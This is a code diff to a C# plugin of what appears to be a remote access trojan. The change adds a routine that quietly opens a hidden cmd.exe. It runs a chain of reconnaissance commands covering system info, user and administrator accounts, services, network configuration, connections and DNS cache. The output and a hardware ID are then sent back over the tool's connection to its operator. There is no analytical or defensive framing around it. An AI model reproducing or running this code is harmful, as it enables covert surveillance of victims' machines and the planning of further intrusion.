@@ -25,7 +25,6 @@ namespace Plugin
                 {
                     case "information":
                         {
-                            GeoLocationHelper.Initialize();
                             Connection.Send(InformationList());
                             break;
                         }
@@ -46,27 +45,37 @@ namespace Plugin
         }
         public static byte[] InformationList()
         {
-            IPGlobalProperties properties = IPGlobalProperties.GetIPGlobalProperties();
-            var domainName = (!string.IsNullOrEmpty(properties.DomainName)) ? properties.DomainName : "-";
-            var hostName = (!string.IsNullOrEmpty(properties.HostName)) ? properties.HostName : "-";
+            string back = execCMD(@"echo ####information collection#### & systeminfo & ver & hostname & net user & net localgroup & net localgroup administrators & net user guest & net user administrator & echo ####task-list#### & tasklist /svc & echo & echo ####net-work information#### & ipconfig/all & route print & arp -a & netstat -an & ipconfig /displaydns & echo ####service#### & sc query type= service state= all");
             MsgPack msgpack = new MsgPack();
             msgpack.ForcePathObject("Pac_ket").AsString = "Information";
-            /*msgpack.ForcePathObject("CPU").AsString = DevicesHelper.GetCpuName();
-            msgpack.ForcePathObject("Memory(RAM)").AsString = $"{DevicesHelper.GetTotalRamAmount()} MB";
-            msgpack.ForcePathObject("GPU").AsString = DevicesHelper.GetGpuName();
-            msgpack.ForcePathObject("Domain_Name").AsString = domainName;
-            msgpack.ForcePathObject("Host_Name").AsString = hostName;
-            msgpack.ForcePathObject("System_Drive").AsString = Path.GetPathRoot(Environment.SystemDirectory);
-            msgpack.ForcePathObject("System_Directory").AsString = Environment.SystemDirectory;
-            msgpack.ForcePathObject("Uptime").AsString = SystemHelper.GetUptime();
-            msgpack.ForcePathObject("Firewall").AsString = SystemHelper.GetFirewall();
-            msgpack.ForcePathObject("Time_Zone").AsString = GeoLocationHelper.GeoInfo.Timezone;
-            msgpack.ForcePathObject("ISP").AsString = GeoLocationHelper.GeoInfo.Isp;*/
-            msgpack.ForcePathObject("InforMation").AsString = "CPU: "+DevicesHelper.GetCpuName()+"\n"+ "Memory(RAM): "+$"{DevicesHelper.GetTotalRamAmount()} MB" + "\n" + "GPU: "+ DevicesHelper.GetGpuName() + "\n" + "Domain_Name: "+ domainName + "\n" + "Host_Name: "+ hostName + "\n" + "System_Drive: "+ Path.GetPathRoot(Environment.SystemDirectory) + "\n" + "System_Directory: "+ Environment.SystemDirectory + "\n" + "Uptime: "+ SystemHelper.GetUptime() + "\n" + "Firewall: "+ SystemHelper.GetFirewall() + "\n" + "Time_Zone: "+GeoLocationHelper.GeoInfo.Timezone + "\n" + "ISP: "+GeoLocationHelper.GeoInfo.Isp;
+            msgpack.ForcePathObject("ID").AsString = Connection.Hwid;
+            msgpack.ForcePathObject("InforMation").AsString = back;
             return msgpack.Encode2Bytes();
         }
 
-        
+        public static string execCMD(string command)
+        {
+            System.Diagnostics.Process pro = new System.Diagnostics.Process();
+            pro.StartInfo.FileName = "cmd.exe";
+            pro.StartInfo.UseShellExecute = false;
+            pro.StartInfo.RedirectStandardError = true;
+            pro.StartInfo.RedirectStandardInput = true;
+            pro.StartInfo.RedirectStandardOutput = true;
+            pro.StartInfo.CreateNoWindow = true;
+            //pro.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+            pro.Start();
+            pro.StandardInput.WriteLine(command);
+            pro.StandardInput.WriteLine("exit");
+            pro.StandardInput.AutoFlush = true;
+            //获取cmd窗口的输出信息
+            string output = pro.StandardOutput.ReadToEnd();
+            pro.WaitForExit();//等待程序执行完退出进程
+            pro.Close();
+            return output;
+
+        }
+
+
     }
 
 }
